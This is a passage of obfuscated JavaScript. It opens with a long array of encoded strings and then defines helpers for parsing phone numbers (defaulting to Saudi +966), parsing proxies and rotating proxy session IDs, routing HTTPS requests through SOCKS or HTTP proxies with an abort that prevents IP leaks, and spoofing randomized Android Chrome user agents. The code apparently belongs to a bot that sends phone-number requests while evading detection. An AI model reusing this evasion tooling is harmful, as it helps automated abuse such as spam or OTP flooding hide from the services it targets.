'B1rdnG', 'C3rHBG', 'De1oqq', 'yxjKDW', 'C2v0uW', 'rgTJvG', 'rNDWyW', 'qMPdrq', 'r2PiAW', 'y0rXvW', 'vg90yq', 'uMf0zq', 'ihnHDG', 'zxiGmW', 'CIbozq', 'q2nVAq', 'Evr1rW', 's2v5Ca', 'rMXVBq', 'DvLxCW', 'CNmGyq', 'yuLQDW', 'CMvTzq', 'v3j5ua', 'z3D5tq', 'v2L0Ea', 'Buv3AG', 'CxrvDa', 'yKnttG', 'BvDyza', 'ohOWBa', 'n1zHAG', 'C3vICW', 'vxLXsq', 'sgfIzW', 'BvHtza', 'Aw1Lia', 'ihjLCW', 'kZK2oa', 'BKf0yq', 'vKrQua', 'wwP3qq', 'svjkAq', 'ihbYBW', 'vNjovG', 'Dhb1Da', 'tuWSia', 'EurdyW', 's2PHCq', 'ihT9', 'xsbuBW', 'EsbMBW', 'icbB', 'vND3CW', 'u2vYDG', 'DhjPBG', 'qKDQCG', 'zefLCq', 'yLPYtG', 'DJeVyq', 'zsboBW', 'm3W5Fa', 'AwnHDa', 'Dxndrq', 'CKfJDa', 'uhP4ua', 'uu5bAG', 'BunAyq', 'Dw50', 'z1LxEG', 'z3rxqG', 'r3LNsq', 'zwn0kq', 'zMXVBW', 'CM9Pza', 'vNrgBa', 'AezinG', 'zMXWuW', 'sgDRqW', 'D2fzDG', 'CML0', 'thn3qq', 'qKPfDG', 'CNDjCq', 'DwfWDW', 'CZOVlW', 'DuD1ua', 'z2v0CW', 'Aw5MBa', 'ELntBa', 'u2fqwa', 'icaVia', 'ywn0Aq', 'vfnlEG', 'Dw5rrq', 'zcaI', 'CIbMDq', 'B3PxsW', 'rMi0nW', 'u0vmrq', 'kcGOlG', 'yvHiyq', 'CMvZBW', 'EffOzG', 'DePuwq', 'y2HLyW', 'lIbbyG', 'zxnZAq', 'zxj2zq', 'B3qGzW', 'Bgvxzq', 'yu9pyW', 'v3bJEG', 'BMv0DW', 'y3b5Eq', 'r0LPwG', 'CMfUzW', '4Pwq4Pwq4Pwq4PwJ', 'CMKVnq', 'ugD0sW', 'ruqGlW', 'DI9UDq', 'BLD4Eq', 'rLfvrG', 'Bur4wG', 'r0PRra', 'D2LUmW', 'igXPBq', 'EMj2DG', 'wurWEG', 'uuHsta', 'CMDLDa', 'wwfbua', 'iZmZmW', 'EwLUzW', 'EwvZ', 'veLdqq', 'odG4', 'zw5KxW', 'qu5lsq', 'B20Gva', 'DfPnBq', 'sKPzrG', 'qLzZrG', 'C3jwsG', 'zcbZyq', 'rKfuqq', 'CMf0zq', 'Aw5N', 'y3rNvW', 'CIbYyq', 'CLreEa', 'zNvSBa', 'txncsa', 'DJ0I', 'ucbqyq', 'uMzIsa', 'Ce1nwa', 'zcaOva', 'wKH6Aq', 'DwnRwa', 'DgvYia', 'v1bqva', 'D1KTDW', 'AwDNzq', 'C2LVBG', 'sLnWCW', 'BLnmAq', 'B24Gza', 'CIbJDq', 'zZfTzW', 'r3Ptta', 'twfSyq', 'CNjSAa', 'Cgz1wq', 'ywrKta', 'ucbuCG', 'CYbgAq', 'zw5K', 'CNnOnG', 'tLzkuG', 'DxG7ia', 'ihnLyW', 'ugPvua', 'rwXztW', 'Agj2vq', 'z3bgra', 'zxiGka', '4Psm4Psa4Psa4Psa', 'zg93BG', 'zwDXqq', 'ntaWkq', 'BM1vCW', 'zw5KCW', 'AJzklq', 'qwjVCG', 'v29wsW', 'u00Tqq', 'u1vjvW', 'DKPJtW', 'B2jRtW', 'ue5qra', 'BNbTia', 'CeHqvq', 'q01Juq', 'sfj2DW', 'iJGIla', 'AfvHua', 'v3vMEq', 'EM5SBW', 'tML1sa', 'zY4GmG', 'nuHvua', 'vK5jza', 'rgjSzW', 'yvm2mG', 'ote2qG', 'ifTKzq', 'zu5gmG', 's0nRBq', 'AvfnBq', 'ENjlEG', 'ALHNvG', 'D0verG', 'mdaPoG', 'qLjvzW', 'u3zHAq', 'icaG', 'BwCSja', 'z3j4tq', 'ALK5yW', 'B3nVzG', 'BwjLCG', 'vvritW', 'uvLesW', 'zMLSDa', 'sKnMvW', 'u1PJBG', 'CMvWzq', 'zgvUyW', 'B3nSta', 'z0PYuW', 'tvrusq', 'BMrgAq', 'D0rtwa', 'FcbFxW', 'EKDQtG', 'BgeUyW', 'lIbqBa', 'wMXVuG', 'v0vvuG', 'ig1PCW', 'r0ztuG', 'B3zbvq', 'CuHhAG', 't0zuvW', 'ywXeAq', 'uLfwrG', 'BLzkCq', 'r2v0lq', 'v094va', 'DvzNvq', 'Dg90yq', 'BfbOEa', 'qMHrtq', 'CMvHyW', 'zLLLtW', 's3jxwG', 'v1zmzq', 'vejvqW', 'EefXqq', 'kZK3mW', 'zNnyDG', 'igzYBW', 'icbpvq', 'CgHgwa', 'wMr0Aa', 'ww90vq', 'CgfYCW', 'rvHbia', 'weDdnW', 'vfPUrG', 'wK5pra', 'ntm3lG', 'uvfbvG', 'rsbbsq', 'wNvvqG', 'rNLuuW', 'AgfIBa', '4PscifVIGki', 'uxbpqW', 'wKDMnW', 'i0zgrG', 'A2jwta', 'AgThqW', 'n0vNwq', 'z3Lhqq', 'zdjUyW', 'zxqTsq', 'ugrXrq', 'ntiZndaXnNvXCfDwuG', 'DwWUDa', 'BMvK', 'Aw5NCW', 'xsbB', 'tJbzBq', 'z2Terq', 'sgTxsq', 'CgvYqW', 'vxLeBW', 'xsbbDq', 'E30UyW', 'icbqCG', 'ywXSia', 'Ff98xW', 'zwuZyG', 'v0LeoG', 'mtq7ia', 'DNDqDG', 'DgfSBa', 'q2HYBW', 'AZaYta', 'vMG5tW', 'ys5Kzq', 'xsbtDa', 'B20Gta', 'AgLUzq', 'uhLhBG', 'Ag8GiG', 'AfL3wq', 'zs5NlG', 'q09nua', 'rNverG', 'uMryDG', 'BhnRAq', 'B2TnEa', 'DwLUzG', 'DMuGyG', 's3jIwG', 'ugjRrq', 'B2DPyW', 'CMvWBa', 'ucbMBW', 'BMCUlG', 'BgLRzq', 'suDhrq', 'vKTdEq', 'BLj0wG', 'A3zZBW', 'uhbovq', 'vgLTzq', 'CM94Eq', 'uMPgBq', 'Dg8GzG', 'zNvUyW', 'zw50lq', 'BMCGDa', 'yNzgza', 'B2WGia', 'C2vY', 'yM9TrG', 'D1HdAW', 'zKPxBq', 'A0a0', 'ovPUqW', 'DNzUtG', 'CgHVBG', 'uvjvrq', 'iduWma', 'zxnZzG', 'BfbOBW', 'nKDLAq', 'q1LPyG', 'y1PKta', 'EwvbDq', 'DZv6na', 'yxr1CW', 'B1n6yG', 'q0zIqW', 'AfDwCq', 'yxncEa', 's2LvsW', 'BtmYxa', 'oLWNjW', 'zKz4sG', 'we1msa', 'rgv2Aq', 'tMPdDa', 'DxrMoa', 'vNDHCW', 'Bgf0zG', 'Axr5ia', 'wMfeDa', 'DxnLCG', 'Dhj1yW', 'wvPxuq', 'u0Tuzq', 'ihn1CG', 'yv9HCa', 'wwHRrW', 'teLurq', 'uxLMwG', 'zwqGka', 'C3rYAq', 'CgLWzq', 't05Rva', 'vw1XrG', 'q09Una', 'EMrhtG', 'rxLYuG', 'rMfZDa', 'sxbZAa', 'CZu6lW', 'De1eEG', 'rM50Cq', 'AMPRsW', 'C2v0Da', 's1rmqq', 'zsaODa', 'Aw1jBG', 'uhnKzG', 'rxfqvW', 'vKLwrG', 'DwrLCW', 'ucbuuG', 'ic1dBW', 'wfGPoG', 'otKWqLzotMv6', 'ifrPBq', 'uLnnEq', 'ugvyuG', 'rKfpyq', 'Agv4', 'C2v0Dq', 'icaGxW', 'CMLHBa', 'CMzJAW', 'CMvXDq', 'v3jPDa', 'BMrPBG', 'ohW1Fa', 'B20V', 'BhPSAG', 've1mla', 'zxjYBW', 'rw50zq', 'sw9YAG', 'zxjUyq', 'weviCa', 'B2jtqq', 'ExLKuG', 'Cfnnqq', 'u2riCW', 'CMvHza', 'DxiGsa', 'ndGWzG', 'Aw51zq', 'mtq4ntaXmLzIzfnMqq', 'yxrLuW', 'C2HHmG', 'id0Gka', 'u2XnCG', 'CfP0AW', 'v2zHsW', 'EKr2Dq', 'zM9YBq', 'u2f1za', 'y3rYBa', 'ksbbCa', 'B25Lxq', 'AvvnCW', 'DcbSzq', 'zu9OtW', 'EgTJza', 'r1D1Da', 'ywjSzq', 'zxr1CG', 'B3vKBa', 'z3jfBa', 'rgHWyW', 'y3j5Ca', 'uwfmwG', 'B05RAG', 'sg93ia', 'sgfYza', 'v2LftW', 'z0LSrW', 'zLbtuG', 'z1nRBq', 'DMvYCW', 'DxjYzq', 'Fdr8nW', 'DgvKlG', 'ignVBG', 'zu9ZBW', 'rKP4CW', 'rcaGia', 'C3rK', 'vuLKtW', 'CMvK', 'uM5OzG', 'nhWWFa', 'BxbLCG', 'BNzHBa', 'CIbUzq', 'BeD4BW', 'uhffAa', 'tujYrW', 'zwqGCW', 'ks5tzq', 't3H2DW', 'D0rTDq', 'BwLTAq', 'lI4k', 'sxreAW', 'id09pq', 'yLvYrW', 'drTBsW', 'ws0Tlq', 'CuLqDG', 'mtn8ma', 'q0XVAW', 'Bca3ia', 'AwTltG', 'C2v0va', 'zLvtqq', 'yxbPsW', 'BKvbBW', 'CM9TAq', 'weztrG', 'zePsDq', 'AwXL', 'svPqra', 'zNLWvW', 'mtyYna', 'ytyYyq', 'B3iOiG', 'B21LlW', 'lf98xa', 'igrVDW', 'wfvHAG', 'C2SGlq', 'Fcb8lW', 'rwfqEa', 'y3Pmsa', 'BgLUzq', 'EwzxrG', 'xf9FxW', 'DgvZDa', 'C2HPzG', 'igLUAG', 'C3bKCW', 'CIbPBG', 'nKLuwM54Ca', 'DwrKsG', 'A3nczG', 'sw1Szq', 'Bw9YEq', 'DgLUzW', 'vxzewG', 'BgX5iq', 'qurenG', 'y2HHAq', 'AezpCW', 'AwzyCa', 's0LHAq', 'u0XQAW', 'zu9IAG', 'A1rQEG', 'DgLUDq', 'rvD1Ca', 'zwLWrq', 'Bca4ia', 'wwy0Ca', 'tgrkva', 'AMvfzG', 'BM9YBq', 'wvjHBW', 'tcbtrq', 'DM5ysW', 'tcaGia', 'qwvzDa', 'zw5XDq', 'y291BG', 'teLdia', 'CYbRzq', 'zgfkEq', 'C2XPyW', 'u2rlzW', 'zw5JBW', 'igLUCW', 'uK52ma', 'Fg91za', 'kfDPBG', 'zgX1rW', 'tZznCW', 'Ag9wza', 'C0n2Bq', 'kYKRkq', 'uvj2xW', 'weTRqW', 'C3bNrG', 'tgLJzq', 'BwuVCW', 'mtG4lG', 'zKHfwa', 'CM92Aq', 'AgPcvq', 't1nstW', 'D1PLyG', 'zwqGAW', 'BuXXyW', 'B3jLlW', 'nejVma', 'Ce9eBG', 'Cufzwq', 'ieLelG', 'Dg9Rzq', 'yxbLCG', 'D1j1AG', 'r09yza', 'qufJtW', 'qtrbqq', 'D2PABa', 'DLDgtG', 'B2Luzq', 'AwLluG', 'rfDzAa', 'sxDqwG', 'sti4rq', 'BNDlsa', 'BvDPwq', 'B01yvq', 'ifvoqq', 'CdmVzW', 'lunPBq', 'DfbLwG', 'wfzNqW', 'x1uWrW', 'rwzSyq', 'DuPKEa', 'zY4k', '4PYxievY', 'ufnuqG', 'C3rKAq', 'C2vHCG', 'qxvjDW', 'z0z1DW', 'zMXHDa', 'v2LUmW', 'x2TPBG', 'wMr0tq', 'iIWGiG', 'rgnKsq', 'uePVtW', 'BMnLlG', 'm3WXFa', 'wZm2Bq', 'BvL1Da', 'ssblzq', 'tMLJAq', 'uMjbqq', 'rtbkxW', 'DK5Qsa', 'AxrLia', 'CNbxwG', 'cLTtrq', 'q2rzra', 'rNvkta', 'yvvhvG', 'DwnJzq', 'vuPvqq', 'wwf2zG', 'tfHJwa', 'q29UDa', 'lwfltq', 'ihWGsa', 't3fJyG', 'xsbtzq', 'DgvNCG', 'qMX4Cq', 'y3LHBG', 'Aw5ZDa', 'AfblAW', 'yMLoBG', 'yxjNDG', 'zxqTqW', 'u2nYyq', 'u0DMua', 'lvLlBW', 'FdeUma', 'DhDzEa', 'DgXLza', 'EsbYzq', 'vg1oDa', 'l2fWAq', 'DMfS', 'ihnLCG', 's3nosq', 'B3jT', 'vuvqrW', 'zeDHnW', 'qwjVBG', 'uM9SDq', 'iokgKIa', 'icPCka', 'BhzL', 'BM93', 'igj5ia', 'qMfOCG', 'Bg9N', 'DePXuW', 'Ag9ZDa', 'AvHIvG', 'D1LerW', 'BgvKia', 'FdeXFa', 'BgDctW', 'v0H4zq', 'vvfUvq', 'Ehv5CW', 'ALmZva', 'rer6qW', 'CgvUza', 'Bw9IAq', 'zezOAW', 'DfzdsG', 'ihG2na', 'BMTtEq', 'y3b1CW', 'ksb8ia', 'icdILze', 'CM95', 'ALLpAW', 'rgvMyq', 'vLb5qq', 'AZbpCW', 'q1qGva', 'D3LKEa', 'DhH0', 's1DzCa', 'oti2qG', 'khj1BG', 'psaOrW', 'DM1HCW', 'qMLIra', 'y3n1tW', 'icD8jW', 'yxrLCG', 'y2TZlq', 'uLHvsG', 'Dgf0Dq', 'ChvZAa', 'wwTVtq', 'iokCLYbt', 'BMziDW', 'zu9Xvq', 's01mzq', 'A09ewG', 'zuXiwG', 'q0jJta', 'CKLXCa', 'qurtEG', 'wxrWvq', 'rNjvrq', 'B0rutq', 'FcaOxW', 'AgDyCG', 'uhjVyW', 'Exvilq', 'AwXLza', 'ueHQvG', 'tg56vq', 'CfDmyq', 'Cu9lua', 'A2fJvq', 'icaGia', 'wM9kDq', 'AhjLyq', 'u2vUDa', 'B0vcqW', 'zYbbyW', 'BwfUEq', 'Etbzna', 'C3rHBq', 'Cgf0Aa', 'DcbZBW', 'Du9Yyq', 'ks4Gvq', 'yxn0ia', 'w1nfva', 'B3v0lG', 'mI9Nzq', 'BgfUAW', 'icdILztILza', 'if9FxW', 'B0D1Bq', 'mwX0CW', 'iokuGIa', 'AfPPvq', 'BMCUia', 'EMTysq', 'sxjsBW', 'BvPMuG', 'zsbPDa', 'us50Eq', 'D2HPBa', 'q3jNvG', 'AvPwwq', 'oIb0lG', 'EhzSzW', 'BcbLCG', 'sNj6uW', 'ifnPBa', 'BIbVCG', 'rMvQza', 'CgLAva', 'Aw5PDa', 'CvzNwa', 'vM1YBq', 'CMvZ', 'CM9YoG', 'Es1HzW', 'yMTkAG', 'CM4GDa', 'sgHIBa', 'DhvZia', 'ms1HAW', 'qwL0Bq', 'Dg9juW', 's1rLEa', 'CgfZCW', 'AwvZrG', 'DfjvEq', 'BNvTyG', 'DKXbAW', 'AuDXwq', 'CM91BG', 'AwvZlG', 'DxHYlq', 'tfPjqG', 'vg9YDa', 'CIbqCG', 'zxnZpW', 'igXLyq', 'vezksW', 'B24GCW', 'CMqGlq', 'oIbnAq', 'EeXzEG', 'uuvMra', 'Dc81mW', 'zg9Yra', 'uIdIGjqG', 'q293qG', 'u3ngCa', 'su9gwq', 'DNv0EG', 'wMv6ra', 'kZK3na', 'BgvtEq', 'Aw5WDq', 'yuLSsG', 'zwfInW', 'iokUNIa', 'igfNyq', 'yxbWzq', 'm20G', 'BKjKCG', 'zwn0', 'if9Gia', 'zgLUzW', 'y2njyq', 'ienssq', 'q3vZDa', 'AfvHtq', 'zxrkDG', 'EhLrvW', 'yNjVDW', 'BffMzG', 'C1DyuW', 'zw4Uia', 'jg1Nia', 'lMq0nG', 'yvjjtG', 'zwfKEq', 'EgnqAq', 'y0PfsW', 'rvb3qG', 'A0juEq', 'Dc5Tzq', 'u1fYCa', 'ls0ktq', 'z0vWwa', 'Av9Rzq', 'rcbiqq', 'ns4Wia', 'r0T6za', 'wvv1zG', 'te9PEa', 'wwXxEq', 'DhvKsW', 'zwjlAq', 'zxjZrG', 'w2rLzG', 'qvDxCW', 'x1nftG', 'B3HPzq', 'quDewG', 'q0H4qq', 'uxfoAq', 'BNrPBG', 'zYaGia', 'rMfhBa', 'zw50Ba', 'v29YAW', 'ywDL', 'q1vssq', 'yxjLia', 'DNjoqW', 'u1fVtq', 'BgLezq', 'm21XnW', 'uNLwsW', 'AerkDW', 'y3fzrG', 'zxHWAq', 'swrztW', 'EMvKqW', 'zxiG', 'wMjSuG', 'Dw5KoG', 'DwLUvq', 'uKuG4Ocu', 'zxjSEq', 'ywqGzG', 'C2v0uG', 'DgvYBG', 'AgfjDq', 'q1jJqG', 'ExHlrG', 'yxrOia', 'BIbtAq', 'Egfpva', 'EgjUrW', 'mtaUma', 'iezPCG', 'CfL1ua', 'Dgviyq', 'lxnZAq', 'C0jbva', 'zujVyq', 'BunqAG', 'whjHDa', 'zxHizq', 'ksGGkq', 'y2fWDa', 'uMPhEG', 'CuzYua', 'uLDHwG', 'zhrLBa', 'oYbxAq', 'Avm2tG', 'sfL5yG', 'ruTMqW', 'lI4U', 'vvjdrq', 'lujfrW', 'AfDozW', 'Bw5cqW', 'wg1IuW', 'AvfzyG', 'yLfqBG', 'zw5LCG', 'quDwqW', 'ieLUDa', 'zxHPDa', 'CNnPBW', 'zZzIyq', 'rxHPDa', 'ic1fCG', 'CfvyEG', 'DgvY', 'DuD5Cq', 'v1nkuq', 'B25ZDa', 'EK1msW', 'vM9SDq', 'CeXpEG', 'z05zAW', 'kZK2nq', 'DhnxAq', 'zxv4Ea', 'jg1Iia', 'C3qGDa', 'yxbWBa', 'z0DKCW', 'yKTPDa', 'DeTQta', 'rhbrBW', 'ENv3BW', 'B24G', 'lu1PuW', 'odm0mG', 'qvf4Bq', 'iefWCa', 'zxnZ', 'tNDwAq', 'zxjNBW', 'ytfQta', 'BNnLza', 'B21cEq', 'kev4Da', 'uMz1tq', 'z2HwyG', 'Bg10sq', 'ieLUDG', 'AwqGCa', 'CwL5Cq', 'y3jHCa', 's3fNyG', 'ogn4qq', 'qujgvq', 'u0fZBW', 'EuT4sa', 'vvzita', 'mhWYFa', 'EuHKva', 'Bw1HBG', 'BxjMuW', 'ywrZia', 'DKTtqW', 'swrevW', 'qK9WwG', 'thnjzW', 'yxbPlG', 'sMLKzq', 'wMHjsa', 'y3vZDa', 'wNnHva', 'BuPVAW', 'BLPJCa', 'zuHcsW', 'z2H0', 'CdOGsq', 'v3fzAa', 'ihLVDq', 'ywXS', 'rLL5yW', 'rwD5Ca', 'sffLBW', 'AfbWDW', 'Aw12za', 'zxnZzq', 'ndG1wa', 'Fcb8ia', 'zMLNDq', 'DNrQyq', 'BKvLua', '4P6ug1SZ', 'zgvZDa', 'Bhzlra', 'lZuZnW', 'AxPMyW', 'C2LN', 'vujpvG', 'sfrsyG', 'mdu5', 'Bcbtzq', 'D1DICW', 'tKCT', 'r3Lqtq', 'tLHvvG', 'yNjVDa', 'ttPCuW', 'y3b1la', 'ihrOAq', 'AMDvvq', 'u3vJyW', 'BgvUDa', 'qMTbsG', 'vfHzAW', 'v01Ava', 'uwT0BG', 'DxbnAq', 'Cefcua', 'rcbPBG', 'mxWYFa', 'y2fSBa', 'ifnLCW', 'veHyAG', 'sNvmEq', 'keDLDa', 'uvzfwq', 'u1LNEG', 'icboBW', 'quLkrW', 'zg5prG', 'ienOCG', 'AgLZiG', 'DhrWuG', 'Aw5Ozq', 'ENDIAa', 'DKPbwa', 'ks4Grq', 'uIbpvq', 'oIbsDq', 'EfzxtG', 'uufJCa', 'ExbYAW', 'kZK3mq', 'DcaTrG', 'ifXFxW', 'z3P2wa', 'Efz2Ea', 'g1SWBq', 'Awq7ia', 'A2v5ia', 'g1SYsG', 'vtDqyW', 'quzMEa', 'ihrHCG', 'AxPguq', 'B2HrEq', 'y2uUyW', 'AgvJAW', 'EKXArW', 'rvvTvW', 'zMzPyW', 'yMv2yW', 'wxjkyq', 'z2zfzq', '8j+tGsbmBW', 'tsbHCG', 'thnWqW', 'z3nvqW', 'zxjZlG', 'yLfSuq', 'zw50zq', 'kZK2nG', 'tM5RrG', 'ufz3vG', 'BNbgEG', 'zu1WEa', 'r2vHvW', 'nZm2mG', 'Bwf0yW', 'yuTNAa', 'Cujyza', 'ifrVAW', 'B2rL', 'DufNCG', 'zguGyq', 'BwuV', 'BgXHlW', 'yvD4ua', 'u1fIva', 'AwnLBG', 'v2f1sG', 'ie1VyG', 'q2LTsq', 'tuLLsa', 'vLrZra', 'ugL5BG', 'z2zHAW', 's0LKvG', 'AwjqDG', 'u0TKAa', 'yvrlBG', 'DentzG', 'rfLTsa', 'i0zgna', 'x18SxW', 'C2nVCa', 'rgvWzq', 'v3H5qq', 'B3rWCW', 'B3rWlq', 'sLzwvq', '4Pwq4Pwq4Pwq4Pwq', 'BLH5qW', 'rvnquG', 'BhjPBq', 'wg9Oza', 'EgjpvG', 'y1jjBG', 'zvnUrW', 'C2uGAq', 'Bca5kq', 'zNjVBq', 'uvnHBq', 'CdiVzW', 'sKzRDG', 'BMXVyq', 'yvb6ua', 'DxjPBG', 'uNfRCq', 'AM5Qua', 'AcbKDq', 'y1vxuW', 'y2DcqG', 'wMH4za', 'A3f2uW', 'CMvZCW', 'y2uGvW', 'B3fuDW', 'vvbJsW', 'BKTWAq', 'B0fdrW', 'z2DLCG', 'zhPPyW', 'iZu1nq', 'kYKRja', 'sfHnqq', 'v3rbvG', 'mtC2lG', 'y2zfua', 'B1j0tq', 'DxrOlW', 'D2HPDa', 'A3rfAW', 'ChjLzG', 'ifrVBW', 'qwrKia', 'B3n0lG', 'EKLmvG', 'zMrHma', 'CMvHCW', 'wKLzwa', 'uhvwCG', 'yNH6tG', 'wZmZBq', 'CuO1nq', 'yLbODW', 'ufPOza', 'zw4GBa', 'BezOzG', 'qwfzvG', 'rMTftG', 'tevsva', 'rM51rq', 'B3DLCG', 'DhntEq', 'ufjxDa', 'zhbSCa', 'tdOGsq', 'DI9ZDa', 'uwf0yq', 'DwXlzW', 'icdINjmG', 'AxDyyG', 'twX2uq', 'zYbYzq', 'EwPPyW', 'l21HyW', 'C3rVCa', 'lYbFia', 'yw5nBG', 'Eurjra', 'icGOja', 'q0z4tW', 'zYbmAq', 'tvbNDW', 'zujtwa', 'A1DLDa', 'zw1PDa', 'ms4WlG', 'nJyXmtrKC0j2EgO', 'qvPvtW', 'rejmvq', 'v3rYAq', 'BhDNCG', 'y3v0Aq', 'zezPyG', 'AwmYEa', 'zw5Zzq'];
  fn1 = function () {
    return v43;
  };
  return fn1();
}
function extractPhoneDetails(v44) {
  let v45 = v44.trim().replace(/\D/g, ''),
    v46 = null,
    v47 = v45;
  if (v45.length === 9) {
    return {
      'fullNumber': "+966" + v45,
      'localPhone': v45,
      'countryCode': 'SA',
      'countryKey': "+966"
    };
  }
  let v48 = '+' + v45;
  const v49 = [...COUNTRY_CODES].sort((v51, v52) => v52.prefix.length - v51.prefix.length);
  for (const v53 of v49) {
    {
      if (v48.startsWith(v53.prefix)) {
        {
          v46 = v53, v47 = v48.substring(v53.prefix.length);
          break;
        }
      }
    }
  }
  if (!v46) {
    const v54 = {};
    return v54.fullNumber = v48, v54.localPhone = v45, v54.countryCode = 'SA', v54.countryKey = "+966", v54;
  }
  const v50 = {};
  return v50.fullNumber = v48, v50.localPhone = v47, v50.countryCode = v46.code, v50.countryKey = v46.prefix, v50;
}
function parseProxy(v55) {
  if (!v55) return null;
  if (typeof v55 === "object") return v55;
  v55 = v55.trim();
  if (!v55) return null;
  let v56, v57, v58, v59;
  if (v55.includes("://")) v55 = v55.split("://")[1];
  if (v55.includes('@')) {
    const v61 = v55.split('@'),
      v62 = v61[0].split(':'),
      v63 = v61[1].split(':');
    v58 = v62[0], v59 = v62[1], v56 = v63[0], v57 = parseInt(v63[1]);
  } else {
    const v64 = v55.split(':');
    if (v64.length === 2) {
      v56 = v64[0], v57 = parseInt(v64[1]);
    } else {
      if (v64.length === 4) {
        {
          if (!isNaN(parseInt(v64[3])) && isNaN(parseInt(v64[1]))) {
            v58 = v64[0], v59 = v64[1], v56 = v64[2], v57 = parseInt(v64[3]);
          } else v56 = v64[0], v57 = parseInt(v64[1]), v58 = v64[2], v59 = v64[3];
        }
      } else v64.length === 3 && (v56 = v64[0], v57 = parseInt(v64[1]), v58 = v64[2]);
    }
  }
  if (!v56 || !v57) return null;
  const v60 = {};
  v60.type = "http", v60.host = v56, v60.port = v57;
  v60.user = v58, v60.pass = v59, v60.original = v55;
  return v60;
}
function rotateSessionId(v65) {
  if (!v65 || !v65.user) return v65;
  const v66 = {
    ...v65
  };
  const v67 = v66;
  if (v67.user.includes("-ssid-")) {
    {
      const v68 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
      v67.user = v67.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v68);
    }
  } else {
    if (v67.user.includes("-session-")) {
      {
        const v69 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v67.user = v67.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v69);
      }
    } else {
      if (/_sid_/i.test(v67.user)) {
        const v70 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
        v67.user = v67.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v70);
      }
    }
  }
  return v67;
}
function createProxyAgent(v71) {
  if (!v71) return null;
  const v72 = typeof v71 === "string" ? parseProxy(v71) : v71;
  if (!v72) return null;
  let v73 = '';
  if (v72.type === "socks5" || v72.type === "socks4") {
    return v73 = "socks5://" + (v72.user ? encodeURIComponent(v72.user) + ':' + encodeURIComponent(v72.pass || '') + '@' : '') + v72.host + ':' + v72.port, new SocksProxyAgent(v73);
  } else return v73 = "http://" + (v72.user ? encodeURIComponent(v72.user) + ':' + encodeURIComponent(v72.pass || '') + '@' : '') + v72.host + ':' + v72.port, new HttpsProxyAgent(v73);
}
function sendRequest(v74, v75, v76, v77, v78 = null, v79 = 20000) {
  return new Promise((v80, v81) => {
    const v82 = new URL(v74),
      v83 = {
        ...v76
      };
    let v84 = v83;
    !v84["accept-encoding"] && (v84["accept-encoding"] = "gzip, deflate, br");
    v77 && (v84["content-length"] = Buffer.byteLength(v77));
    const v85 = {
      'hostname': v82.hostname,
      'path': v82.pathname + v82.search,
      'method': v75,
      'headers': v84,
      'timeout': v79
    };
    if (v78) {
      const v87 = typeof v78 === "object" ? v78 : parseProxy(v78);
      if (!v87 || isNaN(v87.port) || v87.port <= 0) return v81(new Error("FATAL: Invalid proxy. Aborting to prevent IP leak."));
      v85.agent = createProxyAgent(v87);
    }
    const v86 = https.request(v85, v88 => {
      const v89 = [];
      v88.on("data", v90 => v89.push(v90)), v88.on("error", v81);
      v88.on("end", () => {
        let v91 = Buffer.concat(v89);
        const v92 = v88.headers["content-encoding"];
        if (v92 === "gzip") try {
          v91 = zlib.gunzipSync(v91);
        } catch (v93) {} else {
          if (v92 === "deflate") try {
            v91 = zlib.inflateSync(v91);
          } catch (v94) {} else {
            if (v92 === 'br') try {
              v91 = zlib.brotliDecompressSync(v91);
            } catch (v95) {}
          }
        }
        v80({
          'status': v88.statusCode,
          'data': v91.toString("utf8"),
          'headers': v88.headers
        });
      });
    });
    v86.on("error", v81), v86.on("timeout", () => {
      v86.destroy(), v81(new Error("timeout"));
    });
    if (v77) v86.write(v77);
    v86.end();
  });
}
const uuid = () => crypto.randomUUID();
function getRandomClient() {
  const v96 = 150,
    v97 = Math.floor(Math.random() * 9000) + 7000,
    v98 = Math.floor(Math.random() * 200),
    v99 = "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"" + v96 + "\", \"Google Chrome\";v=\"" + v96 + '\x22',
    v100 = {};
  v100.ua = "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v100.mobile = '?1', v100.platform = "\"Android\"";
  const v101 = {};
  v101.ua = "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v101.mobile = '?1', v101.platform = "\"Android\"";
  const v102 = {};
  v102.ua = "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v102.mobile = '?1';
  v102.platform = "\"Android\"";
  const v103 = {};
  v103.ua = "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v103.mobile = '?1', v103.platform = "\"Android\"";
  const v104 = {};
  v104.ua = "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v104.mobile = '?1', v104.platform = "\"Android\"";
  const v105 = {};
  v105.ua = "Mozilla/5.0 (Linux; Android 14; SM-S926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v105.mobile = '?1', v105.platform = "\"Android\"";
  const v106 = {};
  v106.ua = "Mozilla/5.0 (Linux; Android 14; SM-S916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v106.mobile = '?1', v106.platform = "\"Android\"";
  const v107 = {};
  v107.ua = "Mozilla/5.0 (Linux; Android 13; SM-S906B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v96 + ".0." + v97 + '.' + v98 + " Mobile Safari/537.36", v107.mobile = '?1', v107.platform = "\"Android\"";
  const v108 = {};
